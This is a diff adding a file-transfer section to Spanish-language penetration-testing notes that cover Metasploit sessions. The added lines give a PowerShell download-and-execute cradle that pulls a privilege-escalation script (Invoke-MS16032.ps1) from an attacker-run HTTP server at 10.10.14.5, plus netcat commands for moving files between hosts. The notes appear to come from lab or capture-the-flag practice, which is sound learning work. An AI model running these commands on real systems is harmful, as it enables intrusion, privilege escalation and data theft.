@@ -21,3 +21,16 @@ para volver a una sesión especifica:  sessions -i NUMERO_SESION
 
 para upgradear una shell de meterpreter hay que usar el comando "shell".
 
+
+Pasar ficheros
+--------------------------------------------------------------------
+Con Powershell desde una sesión:
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/Invoke-MS16032.ps1') para descargas ficheros con powershell 
+(previamente abriendo un servidor con python -m SimpleHttpServer)
+
+Con Netcat:
+On the receiving end running:
+nc -l -p 1234 > out.file
+
+On the sending end running:
+nc -w 3 [destination] 1234 < out.file
